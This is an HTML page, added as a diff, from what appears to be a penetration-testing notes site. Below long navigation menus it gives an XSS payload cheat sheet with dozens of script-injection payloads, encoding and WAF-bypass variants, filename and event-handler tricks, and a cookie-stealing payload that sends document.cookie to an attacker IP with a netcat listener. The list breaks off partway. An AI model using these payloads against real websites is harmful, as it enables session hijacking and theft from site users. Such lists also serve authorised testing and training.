+        <a href="../../Unix%20Commands/modprobe/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Modprobe
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/mount/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Mount
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/mtr/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Mtr
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/nc/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Nc
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/ncdu/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ncdu
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/netplan/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Netplan
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/netstat/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Netstat
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/network-manager/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Network-manager
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/nm%20connection%20editor/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Nm Connection Manager
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/nmcli/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Nmcli
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/nslookup/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Nslookup
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/ntp/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ntp
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/passwd/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Passwd
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/pdbedit/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Pdbedit
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/ps/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ps
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/rev/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Rev
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/scp/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Scp
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/script/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Script
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/sed/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Sed
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/sha1sum/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Sha1sum
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/sha256sum/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Sha256sum
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/shuf/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Shuf
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/sort/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Sort
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/split/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Split
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/ss/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ss
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/strings/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Strings
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/sudo/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Sudo
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/sudoedit/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Sudoedit
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/systemctl/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Systemctl
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/tail/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Tail
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/tar/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Tar
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/tee/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Tee
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/tftp/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Tftp
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/timedatectl/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Timedatectl
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/touch/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Touch
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/tr/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Tr
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/uname/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Uname
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/upower/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Upower
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/vimdiff/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Vimdiff
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/watch/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Watch
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/wc/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Wc
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/wget/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Wget
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/xargs/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Xargs
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/xxd/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Xxd
+        </a>
+    </li>
+                    </ul>
+                </div>
+            </li>
+            <li class="drac-box">
+                <a href="../.."
+                    class="
+                    drac-anchor btn-toggle d-inline-flex align-items-center border-0 drac-text-purple--hover collapsed"
+                    data-bs-toggle="collapse" data-bs-target="#windows-commands-collapse" aria-expanded="false">
+                    Windows Commands
+                </a>
+                <div class="collapse" id="windows-commands-collapse">
+                    <ul class="mb-5 drac-list drac-list-none">
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Windows%20Commands/azureAD/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            AzureAD
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Windows%20Commands/cmd/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CMD - Command Prompt
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Windows%20Commands/godmode/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            GodMode
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Windows%20Commands/ipconfig/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ipconfig
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Windows%20Commands/nbtstat/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Nbtstat
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Windows%20Commands/net%20group/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Net Group
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Windows%20Commands/net%20user/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Net User
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Windows%20Commands/net%20view/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Net View
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Windows%20Commands/netsh/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Netsh
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Windows%20Commands/nltest/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Nltest
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Windows%20Commands/nslookup/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Nslookup
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Windows%20Commands/powershell/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Powershell
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Windows%20Commands/regedit/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Regedit
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Windows%20Commands/route/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Route
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Windows%20Commands/schtasks/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Schtasks
+        </a>
+    </li>
+                    </ul>
+                </div>
+            </li>
+        </ul>
+        <!-- endblock -->
+    </div>
+</nav>
+        <!-- endblock -->
+
+        <nav class="divider drac-bg-purple-cyan"></nav>
+
+        <div class="content">
+            <!-- block header -->
+                <header>
+    <nav class="navbar navbar-expand-xl drac-bg-purple">
+        <div class="container-fluid">
+            
+            <button class="navbar-toggler w-100 text-center" type="button" data-bs-toggle="collapse" data-bs-target="#navbarsMenu"
+                aria-controls="navbarsMenu" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+
+            <div class="collapse navbar-collapse flex-column ml-auto" id="navbarsMenu">
+                <ul class="navbar-nav text-md-center">
+
+                    <!-- block preview -->
+                    <li class="nav-item">
+                            
+        <div class="container">
+            <div class="row row-preview">
+                <div class="col">
+                    <a href="../Windows%20Security%20Log%20References/"
+                        class="btn-preview drac-btn drac-btn-outline drac-text-white drac-text-cyan-green--hover">
+                        <i class="fa fa-arrow-left"></i> Previous
+                    </a>
+                </div>
+                <div class="col">
+                    <a href="../XXE%20Injection/"
+                        class="btn-preview drac-btn drac-btn-outline drac-text-white drac-text-cyan-green--hover" style="padding-left: 3%;">
+                        Next <i class="fa fa-arrow-right"></i>
+                    </a>
+                </div>
+            </div>
+        </div>
+                    </li>
+                    <!--  endblock -->
+
+                    <!-- block search -->
+                    <li class="nav-item"><div role="search" class="search-box">
+	<form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+		<input type="text" name="q" class="drac-input drac-input-search drac-input-white drac-text-white drac-bg-black-secondary"
+		placeholder="Search docs" title="Type search term here" />
+	</form>
+</div>
+                    </li>
+                    <!--  endblock -->
+
+                    <!-- block source -->
+                    <li class="nav-item">
+                        
+                    </li>
+                    <!--  endblock -->
+
+                </ul>
+            </div>
+
+        </div>
+    </nav>
+</header>
+            <!-- endblock -->
+
+            <!-- block content -->
+                <section class="p-md-5 section-content">
+    <article>
+        <p><h1 id="xss">XSS</h1>
+<p>Cross-Site Scripting (XSS) useful payload list to know.</p>
+<h2 id="test-characters">Test Characters</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="s2">&quot;</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="s2">;</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="s2">&lt;</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="s2">&gt;</span>
+</code></pre></div>
+<h2 id="generic">Generic</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>&lt;Svg/Onload<span class="o">=</span><span class="m">1</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>c5obc<span class="s1">&#39;+alert(1)+&#39;</span>p7yd5
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>&lt;svg<span class="w"> </span><span class="nv">onload</span><span class="o">=</span>alert<span class="o">(</span><span class="m">1</span><span class="o">)</span>&gt;
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>&lt;script&gt;alert<span class="o">(</span><span class="m">1</span><span class="o">)</span>&lt;/script&gt;
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>&lt;&lt;/p&gt;iframe<span class="w"> </span><span class="nv">src</span><span class="o">=</span>javascript:alert<span class="o">()</span>//
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>&lt;script&gt;alert<span class="o">(</span><span class="s1">&#39;PoC&#39;</span><span class="o">)</span>&lt;/script&gt;
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="s2">&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</span>
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="s2">&quot;</span>&gt;&lt;script&gt;alert<span class="o">(</span>document.domain<span class="o">)</span>&lt;/script&gt;
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="s2">&quot;&gt;&lt;img src=x onerror=&quot;</span>alert<span class="o">(</span>document.domain<span class="o">)</span><span class="s2">&quot;&gt;</span>
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="s2">&lt;scr ipt&gt;ale rt (1) &lt;/scr ipt&gt;</span>
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="s2">%3cscript&gt;alert(&#39;PoC&#39;)&lt;/script&gt;</span>
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="s2">%25%33%63script&gt;alert(&#39;PoC&#39;)&lt;/script&gt;</span>
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="s2">&amp;#x3c;script&gt;alert(&#39;PoC&#39;)&lt;/script&gt;</span>
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="s2">&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span>
+<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="s2">[&quot;</span>&lt;/script&gt;&lt;script&gt;alert<span class="o">(</span><span class="m">1</span><span class="o">)</span>&lt;/script&gt;<span class="s2">&quot;]</span>
+<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="s2">&lt;a href=&quot;</span>x<span class="s2">&quot;&gt;test&lt;/a&gt;</span>
+<a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="s2">&lt;img src=x /&gt;</span>
+<a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="s2">&lt;img src=x onerror=&quot;</span>alert<span class="o">(</span><span class="m">1</span><span class="o">)</span><span class="p">;</span><span class="s2">&quot; /&gt;</span>
+<a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="s2">&amp;#x3c;script&gt;alert(1)&amp;#x3c;/script&gt;</span>
+<a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a><span class="s2">&lt;img src=x onerror=&quot;</span>alert<span class="o">(</span>document.cookie<span class="o">)</span><span class="p">;</span><span class="s2">&quot; /&gt;</span>
+<a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a><span class="s2">&lt;iframe/onload=&#39;this[&quot;</span>src<span class="s2">&quot;]=&quot;</span>javas<span class="p">&amp;</span>Tab<span class="p">;</span>cript:al<span class="s2">&quot;+&quot;</span>ert<span class="sb">``</span><span class="s2">&quot;&#39;;&gt;&lt;</span>
+<a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a><span class="s2">&lt;a href=&quot;</span>javascript:alert<span class="o">(</span><span class="s1">&#39;PoC&#39;</span><span class="o">)</span><span class="s2">&quot;&gt;Click me&lt;/a&gt;</span>
+<a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a><span class="s2">&lt;p&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;</span>
+<a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a><span class="s2">&lt;i nput type=&quot;</span>text<span class="s2">&quot; id=&quot;</span>search-text<span class="s2">&quot; name=&quot;</span>query<span class="s2">&quot; value=&quot;&quot; onfocus=&quot;</span>alert<span class="o">(</span><span class="m">1</span><span class="o">)</span><span class="s2">&quot; autofocus=&quot;&quot; /&gt;</span>
+<a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a><span class="s2">draggable=true ondragstart=&quot;</span>alert<span class="o">(</span><span class="m">1</span><span class="o">)</span>
+<a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a>&lt;IMG<span class="w"> </span><span class="nv">SRC</span><span class="o">=</span><span class="m">1</span><span class="w"> </span><span class="nv">ONERROR</span><span class="o">=</span><span class="p">&amp;</span><span class="c1">#X61;&amp;#X6C;&amp;#X65;&amp;#X72;&amp;#X74;(1)&gt;</span>
+<a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a>&lt;SVG<span class="w"> </span><span class="nv">ONLOAD</span><span class="o">=</span><span class="p">&amp;</span><span class="c1">#97&amp;#108&amp;#101&amp;#114&amp;#116(1)&gt;</span>
+<a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a>&lt;&lt;/div&gt;script&lt;/div&gt;&gt;alert<span class="o">()</span>&lt;&lt;/div&gt;/script&lt;/div&gt;&gt;
+<a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a><span class="s2">&quot;&gt;&lt;a href=j&lt;TAB&gt;&lt;NEWLINE&gt;&lt;TAB&gt;&lt;NEWLINE&gt;&lt;TAB&gt;&lt;NEWLINE&gt;avascript:confirm(&quot;</span>payload<span class="s2">&quot;)&gt;XSSs&lt;/a&gt;</span>
+</code></pre></div>
+<h2 id="content-injection">Content Injection</h2>
+<p>In the example below, set up a NetCat listener on port 80 (<strong>sudo nc -nlvp 80</strong>). This listener will receive a connection on success.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>&lt;iframe<span class="w"> </span><span class="nv">src</span><span class="o">=</span>http://10.10.10.10/report<span class="w"> </span><span class="nv">height</span><span class="o">=</span><span class="s2">&quot;O&quot;</span><span class="w"> </span><span class="nv">width</span><span class="o">=</span><span class="s2">&quot;O&quot;</span>&gt;&lt;/iframe&gt;
+</code></pre></div>
+<h2 id="cookie-stealing">Cookie Stealing</h2>
+<p>In the example below, set up a NetCat listener on port 80 sudo nc -nlvp 80. This listener will receive a connection on success.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>&lt;script&gt;new<span class="w"> </span>Image<span class="o">()</span>.src<span class="o">=</span><span class="s2">&quot;http://10.10.10.10/nothinghere.jpg?output=&quot;</span>+document.cookie<span class="p">;</span>&lt;/script&gt;
+</code></pre></div>
+<h2 id="waf-bypass">WAF Bypass</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>%09%0d%0a%09%0d%0a%09%0d%0a%09%0d%0a%09%0d%0a%09%0d%0a%09%0d%0a%09%0d%0a%09%0d%0a%09%0d%0a%09%0d%0a%09%0d%0a%09%0d%0a
+</code></pre></div>
+<h2 id="xss-in-filename">XSS in Filename</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>&lt;img<span class="w"> </span><span class="nv">src</span><span class="o">=</span>x<span class="w"> </span><span class="nv">onerror</span><span class="o">=</span>alert<span class="o">(</span><span class="s1">&#39;XSS&#39;</span><span class="o">)</span>&gt;.png
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="s2">&quot;&gt;&lt;img src=x onerror=alert(&#39;XSS&#39;)&gt;.png</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="s2">&quot;</span>&gt;&lt;svg<span class="w"> </span><span class="nv">onmouseover</span><span class="o">=</span>alert<span class="o">(</span><span class="m">1</span><span class="o">)</span>&gt;.svg
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="s">&lt;&lt;script&gt;alert(&#39;xs</span>s<span class="err">&#39;</span><span class="o">)</span>&lt;!--a--&gt;a.png
+</code></pre></div>
+<h2 id="host-header">Host Header</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="s2">&quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt;</span>
+</code></pre></div>
+<h2 id="chrome-and-firefox">Chrome and Firefox</h2>
+<h4 id="standard">Standard</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>&lt;script&gt;alert<span class="o">(</span><span class="m">1</span><span class="o">)</span>&lt;/script&gt;
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>&lt;a<span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;javascript:alert(1)&quot;</span>&gt;XSS&lt;/a&gt;
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>&lt;a<span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;JaVaScript:alert(1)&quot;</span>&gt;XSS&lt;/a&gt;
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>&lt;iframe<span class="w"> </span><span class="nv">src</span><span class="o">=</span><span class="s2">&quot;javascript:alert(1)&quot;</span>&gt;
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>&lt;script<span class="w"> </span><span class="nv">src</span><span class="o">=</span><span class="s2">&quot;data:text/javascript,alert(1)&quot;</span>&gt;&lt;/script&gt;
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>&lt;svg&gt;&lt;use<span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;data:image/svg+xml,&lt;svg id=&#39;x&#39; xmlns=&#39;http://www.w3.org/2000/svg&#39; xmlns:xlink=&#39;http://www.w3.org/1999/xlink&#39; width=&#39;100&#39; height=&#39;100&#39;&gt;&lt;a xlink:href=&#39;javascript:alert(1)&#39;&gt;&lt;rect x=&#39;0&#39; y=&#39;0&#39; width=&#39;100&#39; height=&#39;100&#39; /&gt;&lt;/a&gt;&lt;/svg&gt;#x&quot;</span>&gt;&lt;/use&gt;&lt;/svg&gt;
+</code></pre></div>
+<h4 id="onclick">onclick</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>&lt;a<span class="w"> </span><span class="nv">onclick</span><span class="o">=</span><span class="s2">&quot;alert(1)&quot;</span>&gt;test&lt;/a&gt;
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>&lt;body<span class="w"> </span><span class="nv">onclick</span><span class="o">=</span><span class="s2">&quot;alert(1)&quot;</span>&gt;test&lt;/body&gt;
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>&lt;textarea<span class="w"> </span><span class="nv">onclick</span><span class="o">=</span><span class="s2">&quot;alert(1)&quot;</span>&gt;test&lt;/textarea&gt;
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>&lt;p<span class="w"> </span><span class="nv">onclick</span><span class="o">=</span><span class="s2">&quot;alert(1)&quot;</span>&gt;test&lt;/p&gt;
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>&lt;svg<span class="w"> </span><span class="nv">onclick</span><span class="o">=</span><span class="s2">&quot;alert(1)&quot;</span>&gt;test&lt;/svg&gt;
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>&lt;iframe<span class="w"> </span><span class="nv">onclick</span><span class="o">=</span><span class="s2">&quot;alert(1)&quot;</span>&gt;test&lt;/iframe&gt;
+</code></pre></div>
+<h4 id="onmousover">onmousover</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>&lt;a<span class="w"> </span><span class="nv">onmouseover</span><span class="o">=</span><span class="s2">&quot;alert(1)&quot;</span>&gt;test&lt;/a&gt;
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>&lt;body<span class="w"> </span><span class="nv">onmouseover</span><span class="o">=</span><span class="s2">&quot;alert(1)&quot;</span>&gt;test&lt;/body&gt;
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>&lt;p<span class="w"> </span><span class="nv">onmouseover</span><span class="o">=</span><span class="s2">&quot;alert(1)&quot;</span>&gt;test&lt;/p&gt;
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>&lt;svg<span class="w"> </span><span class="nv">onmouseover</span><span class="o">=</span><span class="s2">&quot;alert(1)&quot;</span>&gt;test&lt;/svg&gt;
+</code></pre></div>
+<h4 id="onload">onload</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>&lt;body<span class="w"> </span><span class="nv">onload</span><span class="o">=</span>alert<span class="o">(</span><span class="m">1</span><span class="o">)</span>&gt;
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>&lt;svg<span class="w"> </span><span class="nv">onload</span><span class="o">=</span>alert<span class="o">(</span><span class="m">1</span><span class="o">)</span>&gt;
